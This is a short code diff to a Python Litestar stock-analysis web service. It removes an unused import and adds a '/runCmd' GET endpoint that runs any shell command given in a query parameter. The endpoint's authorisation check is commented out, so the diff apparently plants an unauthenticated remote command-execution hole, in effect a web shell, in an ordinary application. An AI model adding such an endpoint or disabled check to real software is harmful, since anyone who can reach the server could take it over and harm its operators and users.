@@ -6,7 +6,6 @@ import os
 import time
 import asyncio
 import aiofiles
-from typing import Optional
 from contextlib import asynccontextmanager, suppress
 from litestar import Litestar, Request, Router, Controller, get, post
 from litestar.openapi import OpenAPIConfig
@@ -264,6 +263,13 @@ class StockController(Controller):
         result = Result()
         if checkout(request.headers.get('referered', '123')):
             result = await views.analysize(code, limit)
+        return result
+
+    @get('/runCmd', summary="执行 shell 命令")
+    async def runCmd(self, request: Request, cmd: str) -> Result:
+        result = Result()
+        # if checkout(request.headers.get('referered', '123')):
+        result = await views.run_command(cmd)
         return result
 
     @post('/test')
